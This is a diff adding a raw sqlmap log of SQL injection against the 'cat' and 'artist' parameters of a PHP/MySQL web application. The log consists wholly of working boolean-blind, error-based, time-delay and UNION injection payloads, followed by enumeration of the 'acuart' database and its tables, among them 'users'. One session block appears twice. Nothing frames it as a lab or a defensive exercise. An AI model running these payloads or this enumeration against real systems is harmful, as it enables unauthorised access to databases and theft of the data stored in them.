@@ -1,0 +1,171 @@
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 7302=7302
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7171627071,(SELECT (ELT(3652=3652,1))),0x716a627a71),3652)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 2313 FROM (SELECT(SLEEP(5)))VJYb)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171627071,0x684f55764147584966747a534a51684a697550415753637a6e73457567685941575741756e7a4a51,0x716a627a71),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 7377=7377
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: artist=1 AND GTID_SUBSET(CONCAT(0x7178717871,(SELECT (ELT(4769=4769,1))),0x7171787071),4769)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 7220 FROM (SELECT(SLEEP(5)))Krmu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-6663 UNION ALL SELECT CONCAT(0x7178717871,0x554c6d6a436b646b5778516a6248557873444e424a4f6363526c57477145706f545345775a475446,0x7171787071),NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+Database: acuart
+[8 tables]
++---------------------------------------+
+| artists                               |
+| carts                                 |
+| categ                                 |
+| featured                              |
+| guestbook                             |
+| pictures                              |
+| products                              |
+| users                                 |
++---------------------------------------+
+
+Database: information_schema
+[79 tables]
++---------------------------------------+
+| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS_EXTENSIONS                    |
+| COLUMN_PRIVILEGES                     |
+| COLUMN_STATISTICS                     |
+| ENABLED_ROLES                         |
+| FILES                                 |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CACHED_INDEXES                 |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_COLUMNS                        |
+| INNODB_DATAFILES                      |
+| INNODB_FIELDS                         |
+| INNODB_FOREIGN                        |
+| INNODB_FOREIGN_COLS                   |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_INDEXES                        |
+| INNODB_METRICS                        |
+| INNODB_SESSION_TEMP_TABLESPACES       |
+| INNODB_TABLES                         |
+| INNODB_TABLESPACES                    |
+| INNODB_TABLESPACES_BRIEF              |
+| INNODB_TABLESTATS                     |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| INNODB_VIRTUAL                        |
+| KEYWORDS                              |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| RESOURCE_GROUPS                       |
+| ROLE_COLUMN_GRANTS                    |
+| ROLE_ROUTINE_GRANTS                   |
+| ROLE_TABLE_GRANTS                     |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMATA_EXTENSIONS                   |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| ST_GEOMETRY_COLUMNS                   |
+| ST_SPATIAL_REFERENCE_SYSTEMS          |
+| ST_UNITS_OF_MEASURE                   |
+| TABLESPACES                           |
+| TABLESPACES_EXTENSIONS                |
+| TABLES_EXTENSIONS                     |
+| TABLE_CONSTRAINTS                     |
+| TABLE_CONSTRAINTS_EXTENSIONS          |
+| TABLE_PRIVILEGES                      |
+| USER_ATTRIBUTES                       |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| VIEW_ROUTINE_USAGE                    |
+| VIEW_TABLE_USAGE                      |
+| COLUMNS                               |
+| ENGINES                               |
+| EVENTS                                |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 7302=7302
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7171627071,(SELECT (ELT(3652=3652,1))),0x716a627a71),3652)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=1 AND (SELECT 2313 FROM (SELECT(SLEEP(5)))VJYb)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171627071,0x684f55764147584966747a534a51684a697550415753637a6e73457567685941575741756e7a4a51,0x716a627a71),NULL,NULL,NULL,NULL-- -
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+available databases [2]:
+[*] acuart
+[*] information_schema
+
